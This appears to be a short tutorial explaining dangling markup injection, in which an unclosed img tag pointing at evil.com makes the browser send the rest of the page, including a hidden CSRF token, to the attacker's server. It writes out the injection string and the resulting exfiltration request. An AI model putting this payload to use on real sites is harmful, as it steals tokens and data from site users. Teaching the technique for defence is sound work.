Dangling markup exploits UNCLOSED HTML tags to capture subsequent page content.

HOW IT WORKS:
1. Attacker injects: <img src="https://evil.com/?data=
2. Tag is UNCLOSED (no closing >)
3. Browser searches for next " to close the src attribute
4. Everything between injection and next " becomes part of the URL
5. Captured content sent to attacker's server

EXAMPLE:
â”€â”€â”€â”€â”€â”€â”€â”€â”€
Page source:
  <div>Hello <img src="https://evil.com/?data= ATTACKER_INPUT</div>
  <input type="hidden" name="csrf" value="SECRET123">
  <p>More content"</p>

Browser interprets:
  <img src="https://evil.com/?data= ATTACKER_INPUT</div>
  <input type="hidden" name="csrf" value="SECRET123">
  <p>More content">

Request sent to evil.com:
  GET /?data=%20ATTACKER_INPUT%3C/div%3E%0A%20%20%3Cinput%20type=%22hidden%22%20name=%22csrf%22%20value=%22SECRET123
